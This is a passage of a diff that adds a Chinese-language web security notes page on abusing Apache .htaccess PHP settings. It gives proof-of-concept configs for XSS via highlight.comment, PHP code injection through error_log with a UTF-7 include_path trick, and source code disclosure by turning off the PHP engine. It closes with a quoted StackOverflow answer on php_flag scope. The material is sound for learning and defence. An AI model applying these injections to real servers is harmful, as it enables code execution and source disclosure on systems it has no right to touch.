+<h2 id="example-3a-xss-via-phps-color">Example 3a: XSS via phps color<a class="headerlink" href="#example-3a-xss-via-phps-color" title="Permanent link">&para;</a></h2>
+<p>Assumtion: phps source handler is activated.</p>
+<div class="codehilite"><pre><span></span>&lt;FilesMatch &quot;.+\.phps$&quot;&gt;
+    SetHandler application/x-httpd-php-source
+    Order Allow,Deny
+    Allow from all
+&lt;/FilesMatch&gt;
+</pre></div>
+
+<p>index.phps:</p>
+<div class="codehilite"><pre><span></span>&lt;?php
+test();
+// comment
+?&gt;
+text
+</pre></div>
+
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_value highlight.comment &#39;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#39;
+</pre></div>
+
+<h2 id="example-3b-xss-via-highlight_file-color">Example 3b: XSS via highlight_file() color<a class="headerlink" href="#example-3b-xss-via-highlight_file-color" title="Permanent link">&para;</a></h2>
+<p>index.php:</p>
+<div class="codehilite"><pre><span></span>&lt;?php
+highlight_file(__FILE__);
+// comment
+</pre></div>
+
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_value highlight.comment &#39;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#39;
+</pre></div>
+
+<h2 id="example-4a-failed-php-injection-via-error_log-and-include_path">Example 4a: failed PHP injection via error_log and include_path<a class="headerlink" href="#example-4a-failed-php-injection-via-error_log-and-include_path" title="Permanent link">&para;</a></h2>
+<p>In this example PHP correctly encodes HTML entities in log messages. The injection fails.</p>
+<p>index.php:</p>
+<div class="codehilite"><pre><span></span>&lt;?php include(&#39;foo&#39;);
+</pre></div>
+
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_value error_log /var/www/ex4a/foo.php
+php_value include_path &quot;&lt;?php phpinfo(); __halt_compiler();&quot;
+</pre></div>
+
+<h2 id="example-4b-failed-php-injection-via-error_log-and-auto_prepend_file">Example 4b: failed PHP injection via error_log and auto_prepend_file<a class="headerlink" href="#example-4b-failed-php-injection-via-error_log-and-auto_prepend_file" title="Permanent link">&para;</a></h2>
+<p>index.php: (empty)</p>
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_value error_log /var/www/ipc/ex4b/foo.php
+php_value auto_prepend_file &quot;&lt;?php phpinfo(); __halt_compiler();&quot;
+</pre></div>
+
+<h2 id="example-4c-php-code-injection-via-error_log-and-utf-7">Example 4c: PHP code injection via error_log and UTF-7<a class="headerlink" href="#example-4c-php-code-injection-via-error_log-and-utf-7" title="Permanent link">&para;</a></h2>
+<p>index.php: (empty)</p>
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_value error_log /var/www/ipc/ex4c/foo.php
+#---- &quot;&lt;?php phpinfo(); __halt_compiler();&quot; in UTF-7:
+php_value include_path &quot;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;
+
+php_flag zend.multibyte 1
+php_value zend.script_encoding &quot;UTF-7&quot;
+</pre></div>
+
+<h2 id="example-6-source-code-disclosure">Example 6: Source code disclosure<a class="headerlink" href="#example-6-source-code-disclosure" title="Permanent link">&para;</a></h2>
+<p>index.php:</p>
+<div class="codehilite"><pre><span></span>&lt;?php some_code();
+</pre></div>
+
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_flag engine 0
+</pre></div>
+
+<h2 id="stackoverflow">StackOverflow上一个问题：<a class="headerlink" href="#stackoverflow" title="Permanent link">&para;</a></h2>
+<p>For example directory named <code>test</code> placed .htacess with the only code in the first line <code>php_flag engine off</code></p>
+<p>In directory <code>test</code> placed file <code>test.php</code> with this code <code>echo 1+3;</code></p>
+<p>And in another file (<code>main.php</code>) placed <code>include("test.php");</code></p>
+<p>Open <code>main.php</code> and see <code>4</code> (result of 1+3).</p>
+<p>Added <code>AddType text/plain .php .phtml .php3</code>. The same result.</p>
+<p>I expected because of <code>php_flag engine off</code> code in <code>test.php</code> would not execute.</p>
+<h2 id="answer">answer:<a class="headerlink" href="#answer" title="Permanent link">&para;</a></h2>
+<p>The .htaccess directives are only relevant to Apache when processing the request. It will prevent Apache from directly executing the <code>test.php</code> file (or rather, it will prevent PHP from doing anything when Apache invokes it). However, if Apache is executing a script in some other folder, then you have a running PHP instance. This instance can do whatever it wants. It will not interpret any further .htaccess files or regard any <code>php_flag</code> directives, since those only apply <em>before</em> PHP was started. Once it's running it's running.</p>
+<p>.htaccess files are only interpreted by Apache as follows:</p>
+<ul>
+<li>given path is <code>/foo/bar/test.php</code></li>
+<li>Apache checks if <code>/.htaccess</code> exists, applies its rules if so</li>
+<li>Apache checks if <code>/foo/.htaccess</code> exists, applies its rules if so</li>
+<li>Apache checks if <code>/foo/bar/.htaccess</code> exists, applies its rules if so</li>
+</ul>
+<p>PHP on the other hand just directly includes <code>foo/bar/test.php</code>, it doesn't look for or interpret .htaccess files.</p>
+<h2 id="_2">参考<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a href="https://stackoverflow.com/questions/28555829/htaccess-php-flag-engine-off-does-not-work-or-i-do-not-understand-how-it-works">StackOverflow</a></p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../ch1/" title=".user.ini构成的后门" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                .user.ini构成的后门
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../web/" title="Web基础知识" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                Web基础知识
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.245445c6.js"></script>
+      
+        
+        
+          
+          <script src="../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../assets/javascripts/lunr/lunr.ja.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+    
+  </body>
+</html>
